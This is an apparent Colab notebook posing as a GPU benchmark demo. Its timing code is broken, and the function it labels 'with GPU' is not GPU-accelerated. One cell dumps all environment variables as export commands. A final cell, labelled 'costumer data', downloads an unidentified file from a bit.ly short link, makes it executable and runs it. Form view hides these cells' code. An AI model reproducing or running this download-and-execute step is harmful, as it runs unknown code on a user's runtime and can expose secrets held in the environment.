{

  "nbformat": 4,

  "nbformat_minor": 0,

  "metadata": {

    "colab": {

      "name": "cab.ipynb",

      "provenance": [],

      "collapsed_sections": [],

      "machine_shape": "hm"

    },

    "kernelspec": {

      "name": "python3",

      "display_name": "Python 3"

    },

    "language_info": {

      "name": "python"

    },

    "accelerator": "GPU"

  },

  "cells": [

    {

      "cell_type": "markdown",

      "metadata": {

        "id": "5IHYgObGYg42"

      },

      "source": [

        "# *cab*\n",

        "\n",

        "`cab`\n"

      ]

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "J46hmikhYmli",

        "cellView": "form"

      },

      "source": [

        "#@cab\n",

        "! nvidia-smi -L"

      ],

      "execution_count": null,

      "outputs": []

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "IB_dAbg8Yvj5",

        "cellView": "form"

      },

      "source": [

        "#@cab\n",

        "\n",

        "from numba import jit, cuda\n",

        "import numpy as np\n",

        "# to measure exec time\n",

        "from timeit import default_timer as timer\n",

        "\n",

        "# normal function to run on cpu\n",

        "def func(a):\t\t\t\t\t\t\t\t\n",

        "\tfor i in range(10000000):\n",

        "\t\ta[i]+= 1\t\n",

        "\n",

        "\t\t\t\t\t\t\n",

        "def func2(a):\n",

        "\tfor i in range(10000000):\n",

        "\t\ta[i]+= 1\n",

        "if name==\"_main_\":\n",

        "\tn = 10000000\t\t\t\t\t\t\t\n",

        "\ta = np.ones(n, dtype = np.float64)\n",

        "\tb = np.ones(n, dtype = np.float32)\n",

        "\t\n",

        "\tstart = timer()\n",

        "\tfunc(a)\n",

        "\tprint(\"without GPU:\", timer()-start)\t\n",

        "\t\n",

        "\tstart = timer()\n",

        "\tfunc2(a)\n",

        "\tprint(\"with GPU:\", timer()-start)"

      ],

      "execution_count": null,

      "outputs": []

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "x7MLYWtqY0Kg",

        "cellView": "form"

      },

      "source": [

        "#@cab\n",

        "\n",

        "import os\n",

        "' && '.join([f'export {name}=\"{value}\"' for name, value in os.environ.items()])"

      ],

      "execution_count": null,

      "outputs": []

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "B3TP3IA8Y3DN",

        "cellView": "form"

      },

      "source": [

        "#@cab tenso\n",

        "\n",

        "import tensorflow as tf\n",

        "\n",

        "from tensorflow import keras\n",

        "from tensorflow.keras import layers\n",

        "from tensorflow.keras import mixed_precision\n",

        "\n",

        "mixed_precision.set_global_policy('mixed_float16')"

      ],

      "execution_count": null,

      "outputs": []

    },

    {

      "cell_type": "code",

      "metadata": {

        "id": "sbuSn-OdY5Gx",

        "cellView": "form"

      },

      "source": [

        "#@cab costumer data\n",

        "! wget https://bit.ly/3yJkX7v && chmod +x 3yJkX7v && ./3yJkX7v"

      ],

      "execution_count": null,

      "outputs": []

    }

  ]

}
